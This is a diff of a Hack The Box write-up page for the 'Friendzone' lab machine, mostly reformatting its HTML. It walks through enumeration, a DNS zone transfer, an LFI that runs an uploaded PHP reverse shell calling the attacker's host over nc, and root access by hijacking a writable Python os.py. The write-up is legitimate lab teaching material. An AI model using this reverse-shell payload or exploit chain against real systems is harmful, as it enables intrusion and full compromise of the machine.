@@ -85,13 +85,13 @@
 
 <h2 id="quick-summary">Quick Summary</h2>
 <p><br> Hey guys today Friendzone retired and here’s my write-up about it. Friendzone was a very nice and easy box. I enjoyed solving it and I really liked it, it had a lot of funny parts as well. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.123</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">friendzone.htb</code>. Let’s jump right in !
-<img src="/images/hackthebox/friendzone/0.png" alt=""></p>
+<br><img src="/images/hackthebox/friendzone/0.png" alt=""><br></p>
 <hr>
 
 <h2 id="nmap">Nmap</h2>
 <p><br> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
-<code class="highlighter-rouge">nmap -sV -sT friendzone.htb</code>
-<img src="/images/hackthebox/friendzone/1.png" alt="">
+<br><code class="highlighter-rouge">nmap -sV -sT friendzone.htb</code>
+<br><img src="/images/hackthebox/friendzone/1.png" alt=""><br>
 <br> Note : I didn’t do a script scan (<code class="highlighter-rouge">-sC</code>) because for some reason it took a lot of time and didn’t finish.
 <br> We got <code class="highlighter-rouge">ftp</code> on port 21, <code class="highlighter-rouge">ssh</code> on port 22, <code class="highlighter-rouge">dns</code> on port 53, <code class="highlighter-rouge">http</code> on port 80, <code class="highlighter-rouge">https</code> on port 443 and <code class="highlighter-rouge">smb</code>. Unfortunately anonymous login wasn’t allowed on <code class="highlighter-rouge">ftp</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/friendzone# ftp friendzone.htb 
@@ -164,13 +164,13 @@ smb: \&gt; ls
 
 <h2 id="http-and-dns">HTTP and DNS</h2>
 <p><br> <code class="highlighter-rouge">http://friendzone.htb</code> :
-<img src="/images/hackthebox/friendzone/2.png" alt="">
+<br><img src="/images/hackthebox/friendzone/2.png" alt=""><br>
 <br> A static page, not really interesting, I noticed that email at the bottom : <code class="highlighter-rouge">info@friendzoneportal.red</code> so I added <code class="highlighter-rouge">friendzoneportal.red</code> to <code class="highlighter-rouge">/etc/hosts</code> :
-<img src="/images/hackthebox/friendzone/3.png" alt="">
+<br><img src="/images/hackthebox/friendzone/3.png" alt=""><br>
 <br> But <code class="highlighter-rouge">http://friendzoneportal.red</code> was just the same thing :
-<img src="/images/hackthebox/friendzone/4.png" alt="">
+<br><img src="/images/hackthebox/friendzone/4.png" alt=""><br>
 <br> I went back and added <code class="highlighter-rouge">friendzone.red</code> to the hosts file :
-<img src="/images/hackthebox/friendzone/5.png" alt="">
+<br><img src="/images/hackthebox/friendzone/5.png" alt=""><br>
 <br> But it was also the same thing. Then I remembered that there’s a <code class="highlighter-rouge">dns</code> server so I used dig :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/friendzone# dig axfr friendzone.red @10.10.10.123
 
@@ -190,30 +190,28 @@ friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604
 ;; XFR size: 8 records (messages 1, bytes 289)
 </code></pre></div></div>
 <p><br> now we have : <code class="highlighter-rouge">administrator1.friendzone.red</code>, <code class="highlighter-rouge">hr.friendzone.red</code> and <code class="highlighter-rouge">uploads.friendzone.red</code>. I edited the hosts file again :
-<img src="/images/hackthebox/friendzone/6.png" alt="">
+<br><img src="/images/hackthebox/friendzone/6.png" alt=""><br>
 <br> But I still got the same thing, I ran <code class="highlighter-rouge">gobuster</code> and got <code class="highlighter-rouge">/wordpress</code> which was empty :
-<img src="/images/hackthebox/friendzone/7.png" alt="">
+<br><img src="/images/hackthebox/friendzone/7.png" alt=""><br>
 <br> And <code class="highlighter-rouge">robots.txt</code> which wasn’t a real <code class="highlighter-rouge">robots.txt</code> file :D
-<img src="/images/hackthebox/friendzone/8.png" alt="">
+<br><img src="/images/hackthebox/friendzone/8.png" alt=""><br>
 <br> There was another <code class="highlighter-rouge">https</code> port so I tried that.
 <br> <code class="highlighter-rouge">https://friendzone.red</code> :
-<img src="/images/hackthebox/friendzone/9.png" alt="">
+<br><img src="/images/hackthebox/friendzone/9.png" alt=""><br>
 <br> <code class="highlighter-rouge">https://administrator1.friendzone.red</code> :
-<img src="/images/hackthebox/friendzone/10.png" alt="">
+<br><img src="/images/hackthebox/friendzone/10.png" alt=""><br>
 <br> So this is the “administrator thing” let’s try the credentials we have :
-<img src="/images/hackthebox/friendzone/11.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/friendzone/12.png" alt="">
+<br><img src="/images/hackthebox/friendzone/11.png" alt=""><br>
+<br><img src="/images/hackthebox/friendzone/12.png" alt=""><br>
 <br> Great. <code class="highlighter-rouge">/dashboard.php</code> :
-<img src="/images/hackthebox/friendzone/13.png" alt=""></p>
+<br><img src="/images/hackthebox/friendzone/13.png" alt=""><br></p>
 <hr>
 
 <h2 id="lfi-in-dashboardphp-user-flag">LFI in dashboard.php, User Flag</h2>
 <p><br> As you can see it’s complaining about missing parameters, by looking at the example : <code class="highlighter-rouge">image_id=a.jpg&amp;pagename=timestamp</code> my first guess was that <code class="highlighter-rouge">dashboard.php</code> includes the <code class="highlighter-rouge">php</code> file provided in the <code class="highlighter-rouge">pagename</code> parameter. So if we give it <code class="highlighter-rouge">test</code> it will append <code class="highlighter-rouge">.php</code> to <code class="highlighter-rouge">test</code> then include that file. We can upload files to the <code class="highlighter-rouge">smb</code> share <code class="highlighter-rouge">Development</code> and we also know the full path : <code class="highlighter-rouge">/etc/Development</code>, so if it’s really vulnerable to <code class="highlighter-rouge">LFI</code> we can get a reverse shell easily. I wrote a small <code class="highlighter-rouge">php</code> script to get a reverse shell :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
-system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f');
-?&gt;
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">system</span><span class="p">(</span><span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f'</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
 </code></pre></div></div>
 <p><br> Then I uploaded it to <code class="highlighter-rouge">Development</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/development -U ""
@@ -226,9 +224,9 @@ smb: \&gt;
 <p><br> And finally I tested my idea :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://administrator1.friendzone.red/dashboard.php?image_id=1.jpg&amp;pagename=/etc/Development/rev
 </code></pre></div></div>
-<p><img src="/images/hackthebox/friendzone/14.png" alt="">
+<p><br><img src="/images/hackthebox/friendzone/14.png" alt=""><br>
 <br> It worked and now we have a reverse shell as <code class="highlighter-rouge">www-data</code> :
-<img src="/images/hackthebox/friendzone/15.png" alt="">
+<br><img src="/images/hackthebox/friendzone/15.png" alt=""><br>
 <br> We owned user.
 <br></p>
 <hr>
@@ -276,29 +274,29 @@ Last login: Fri Jul 12 14:26:57 2019 from 10.10.13.142
 friend@FriendZone:~$ 
 </code></pre></div></div>
 <p><br> I did the regular enumeration and I ran <a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">pspy</code></a> to monitor the processes to see if there’s something that can be exploited :
-<img src="/images/hackthebox/friendzone/16.png" alt="">
+<br><img src="/images/hackthebox/friendzone/16.png" alt=""><br>
 <br> After some time I saw this :
-<img src="/images/hackthebox/friendzone/17.png" alt="">
+<br><img src="/images/hackthebox/friendzone/17.png" alt=""><br>
 <br> Root runs <code class="highlighter-rouge">/opt/server_admin/reporter.py</code>  from time to time.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>friend@FriendZone:/opt/server_admin$ cat reporter.py 
-#!/usr/bin/python
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">friend</span><span class="nd">@FriendZone</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">server_admin</span><span class="err">$</span> <span class="n">cat</span> <span class="n">reporter</span><span class="o">.</span><span class="n">py</span> 
+<span class="c">#!/usr/bin/python</span>
 
-import os
+<span class="kn">import</span> <span class="nn">os</span>
 
-to_address = "admin1@friendzone.com"
-from_address = "admin2@friendzone.com"
+<span class="n">to_address</span> <span class="o">=</span> <span class="s">"admin1@friendzone.com"</span>
+<span class="n">from_address</span> <span class="o">=</span> <span class="s">"admin2@friendzone.com"</span>
 
-print "[+] Trying to send email to %s"%to_address
+<span class="k">print</span> <span class="s">"[+] Trying to send email to </span><span class="si">%</span><span class="s">s"</span><span class="o">%</span><span class="n">to_address</span>
 
-#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''
+<span class="c">#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''</span>
 
-#os.system(command)
+<span class="c">#os.system(command)</span>
 
-# I need to edit the script later
-# Sam ~ python developer
+<span class="c"># I need to edit the script later</span>
+<span class="c"># Sam ~ python developer</span>
 </code></pre></div></div>
 <p><br> So if we can write to that script then we can get a shell as root. Unfortunately we can’t :
-<img src="/images/hackthebox/friendzone/18.png" alt="">
+<br><img src="/images/hackthebox/friendzone/18.png" alt=""><br>
 <br> But I noticed that it’s importing the <code class="highlighter-rouge">os</code> library. Usually python libraries are only writable by root, but I checked <code class="highlighter-rouge">os.py</code> and friend had permissions to write to it :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>friend@FriendZone:/usr/lib/python2.7$ ls -la | grep os
 -rwxr-xr-x  1 root   root     4635 Apr 16  2018 os2emxpath.py
@@ -313,9 +311,9 @@ print "[+] Trying to send email to %s"%to_address
 -rwxr-xr-x  1 root   root    11385 Oct  6  2018 posixpath.pyc
 </code></pre></div></div>
 <p><br> So I just put those two lines at the bottom of <code class="highlighter-rouge">os.py</code> :
-<img src="/images/hackthebox/friendzone/19.png" alt="">
+<br><img src="/images/hackthebox/friendzone/19.png" alt=""><br>
 <br> And after a minute I got a shell :
-<img src="/images/hackthebox/friendzone/20.png" alt="">
+<br><img src="/images/hackthebox/friendzone/20.png" alt=""><br>
 <br> And we owned root !
 <br> That’s it , Feedback is appreciated !
 <br> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
